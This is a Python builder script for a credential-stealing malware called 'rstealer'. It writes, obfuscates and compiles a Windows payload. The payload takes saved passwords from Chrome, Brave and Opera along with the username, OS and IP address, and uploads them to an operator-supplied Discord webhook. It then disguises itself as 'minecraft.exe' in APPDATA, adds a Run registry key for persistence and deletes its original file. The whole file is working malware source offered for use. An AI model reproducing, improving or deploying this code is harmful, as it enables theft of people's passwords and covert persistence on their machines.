import os
import rstealer_encoder
import make_exe
from banner import roman_banner
from colorama import Fore, Style, init

init(autoreset=True)

def clear_screen():
    os.system("cls")
    
def main():
    clear_screen()
    print(Fore.RED + roman_banner + Style.RESET_ALL)
    webhook_url = input(Fore.YELLOW + "[?] Enter Discord webhook URL: " + Style.RESET_ALL).strip()
    icon_path = input(Fore.YELLOW + "[?] Icon name from icons folder (default: icons\\default_icon.ico): " + Style.RESET_ALL).strip()
    
    if not icon_path:
        print(Fore.CYAN + "[i] No icon name given. Using default icon." + Style.RESET_ALL)
        icon_path = "icons/default_icon.ico"

    main_code = f"""
import requests
import os
import tempfile
import platform
import socket
import psutil
import winreg
import shutil
import sys
import getpass
import json
import subprocess
from get_chrome_pass import ChromeCredentialRetriever
from get_brave_pass import BraveCredentialRetriever
from get_opera_pass import OperaCredentialRetriever
import time

flag_file = os.path.join(os.getenv("APPDATA"), "IMPORTANT.flag")

def get_system_info():
    system_info = {{
        "OS Version": platform.platform(),
        "Username": getpass.getuser(),
        "IP Address": requests.get('https://api.ipify.org').text
    }}
    return "\\n".join(f"{{key}}: {{value}}" for key, value in system_info.items())

def copy_and_set_autostart():
    new_path = os.path.join(os.getenv("APPDATA"), "minecraft.exe")
        
    if not os.path.exists(new_path):
        try:
            shutil.copy(sys.executable, new_path)
        except Exception as e:
            print(f"Dosya kopyalanırken hata oluştu: {{e}}")
            return

    reg_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "minecraft.exe", 0, winreg.REG_SZ, new_path)
        winreg.CloseKey(key)
        print("Regedit added successfully.")
    except Exception as e:
        print(f"While adding regedit there was an error: {{e}}")
        return

    try:
        with open(flag_file, "w") as f:
            f.write("installed")
    except Exception as e:
        print(f"While creating flag there was an error: {{e}}")
        return

    try:
        os.remove(sys.executable)
    except Exception as e:
        print(f"While original file deleting there was an error: {{e}}")

if __name__ == "__main__":
    retrievers = [
        ("Chrome", ChromeCredentialRetriever()), 
        ("Brave", BraveCredentialRetriever()), 
        ("Opera", OperaCredentialRetriever())
    ]
    webhook_url = "{webhook_url}"
    
    all_data = get_system_info() + "\\n" + "-"*40 + "\\n"
    
    try:
        for browser_name, retriever in retrievers:
            browser_data = retriever.execute()
            if browser_data:
                all_data += f"{{browser_name}} Passwords:\\n{{browser_data}}\\n" + "-"*40 + "\\n"
            else:
                all_data += f"{{browser_name}} No passwords.\\n" + "-"*40 + "\\n"
    except Exception as e:
        all_data = f"Error: {{e}}"

    temp_dir = os.getenv('APPDATA')
    if not temp_dir:
        temp_dir = tempfile.gettempdir()

    file_path = os.path.join(temp_dir, "credentials_data.txt")
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(all_data)
    
    if all_data.strip():
        payload = {{
            "content": "Passwords and system informations scraped successfully. Here is the file:"
        }}
        with open(file_path, "rb") as f:
            response = requests.post(webhook_url, files={{"file": f}}, data=payload)
    else:
        payload = {{
            "content": "No credentials found."
        }}
        response = requests.post(webhook_url, json=payload)
    
    try:
        if response.status_code == 200:
            print("Data sent succesfully!")
        else:
            print(f"Error: {{response.status_code}}")
    except Exception as e:
        print(f"Error: {{e}}")

    os.remove(file_path)

    if not os.path.exists(flag_file):
        copy_and_set_autostart()
"""

    with open("rstealer_output.py", "w", encoding="utf-8") as f:
        f.write(main_code)
    print(Fore.GREEN + "[+] Created file: rstealer_output.py --> Encoding now..." + Style.RESET_ALL)
    
    with open("rstealer_output.py", "r", encoding="utf-8") as f:
        original_code = f.read()
        rstealer_encoder.main()
    print(Fore.GREEN + "[+] Encoding complete! Output: final_output.py --> Creating EXE..." + Style.RESET_ALL)
    make_exe.make_exe(icon_path)
    
if __name__ == "__main__":
    main()
